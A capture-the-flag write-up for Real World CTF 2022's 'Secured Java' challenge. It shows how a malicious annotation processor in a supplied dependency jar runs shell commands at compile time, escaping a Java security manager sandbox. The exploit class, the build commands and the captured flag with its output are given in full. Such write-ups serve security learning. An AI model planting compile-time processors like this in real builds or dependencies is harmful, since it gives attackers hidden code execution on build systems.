# Real Wolrd CTF 2022

## Secured Java

> Found a way to run untrusted java code
> nc 139.224.248.65 1337

## Analysis

The challenge consists of a single python file that receives a Main.java and the dep.jar (jar containing the dependencies required for main to run). Then it compiles the Main class and runs it with the security manager and with 0 permissions on the code.

## Exploit

This is an easy challenge if you are very familiar with java's jar files. Since I wasn't it took me a while to discover the solution. The security manager won't allow us to do anything and there isn't any known ways to bypass it. Therefore, our solution can't rely on running our Main class.
However, in a jar file, you can specify a class to create other source files at compile time. Meaning that it will execute our code without the security manager, just like we needed.
All the classes that execute at compile time need to extend AbstractProcessor.

```java
import java.util.*;
import java.io.*;
import javax.lang.model.*;
import javax.lang.model.element.*;
import javax.annotation.processing.*;

public class Exploit extends AbstractProcessor{

    static {
        try{
            BufferedReader in = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("cat /flag").getInputStream()));
             System.out.println(in.readLine());
        }
        catch(Exception e){
            System.err.println("Err:" + e.getMessage());

        }
    }

    // These methods needs to be defined, but doesn't matter
    // as the above static block will run before anything else
    @Override
    public synchronized void init(ProcessingEnvironment env) { }
    @Override
    public boolean process(Set<? extends TypeElement> annoations, RoundEnvironment env) { return false; }
    @Override
    public Set<String> getSupportedAnnotationTypes() { return null; }
    @Override
    public SourceVersion getSupportedSourceVersion() { return null; }
  
}
```

Above is my exploit class that will be executed at compile time. The inherited methods need to be defined to ensure that the Exploit.java compiles, but aren't necessary in the exploit since the static method will be executed before any of them. The static method simply runs cat /flag and prints it to the standard output (retrieving our flag).
We our Explooit class done, we need to create the jar file. To ensure that the class will be run at runtime, we will need to put the class' name in the file META-INF/services/javax.annotation.processing.Processor and add it to the jar. The commands I ran as are follows.

```bash
javac -cp javax.jar Exploit.java
jar cvf dep.jar META-INF Exploit.class
```

This creates the dep.jar file with the Exploit class as a service. The Main.java can have anything you won't as long as it doesn't fail while compiling.
Finnaly, all there it need to be done is to send the Main.java and dep.jar to the server and get the flag

```bash
rwctf{818dd1e92a56d1badd5234367d15d563}
An annotation processor threw an uncaught exception.
Consult the following stack trace for details.
java.lang.NullPointerException: Cannot invoke "javax.lang.model.SourceVersion.compareTo(java.lang.Enum)" because "procSourceVersion" is null
    at jdk.compiler/com.sun.tools.javac.processing.JavacProcessingEnvironment$ProcessorState.checkSourceVersionCompatibility(JavacProcessingEnvironment.java:765)
    at jdk.compiler/com.sun.tools.javac.processing.JavacProcessingEnvironment$ProcessorState.<init>(JavacProcessingEnvironment.java:704)
    at jdk.compiler/com.sun.tools.javac.processing.JavacProcessingEnvironment$DiscoveredProcessors$ProcessorStateIterator.next(JavacProcessingEnvironment.java:829)
    at jdk.compiler/com.sun.tools.javac.processing.JavacProcessingEnvironment.discoverAndRunProcs(JavacProcessingEnvironment.java:925)
    at jdk.compiler/com.sun.tools.javac.processing.JavacProcessingEnvironment$Round.run(JavacProcessingEnvironment.java:1269)
    at jdk.compiler/com.sun.tools.javac.processing.JavacProcessingEnvironment.doProcessing(JavacProcessingEnvironment.java:1384)
    at jdk.compiler/com.sun.tools.javac.main.JavaCompiler.processAnnotations(JavaCompiler.java:1261)
    at jdk.compiler/com.sun.tools.javac.main.JavaCompiler.compile(JavaCompiler.java:935)
    at jdk.compiler/com.sun.tools.javac.main.Main.compile(Main.java:317)
    at jdk.compiler/com.sun.tools.javac.main.Main.compile(Main.java:176)
    at jdk.compiler/com.sun.tools.javac.Main.compile(Main.java:64)
    at jdk.compiler/com.sun.tools.javac.Main.main(Main.java:50)
Compiling...
Failed to compile!
```

## Final Notes

Overall it was an interesting challenge as it was my first java exploit. Also, I now understand why it had schrodinger dificulty, since it was easy and not easy at the same time (if you knew how to run code at compile time this was an easy challenge, otherwise it proved to be a litle complicated)
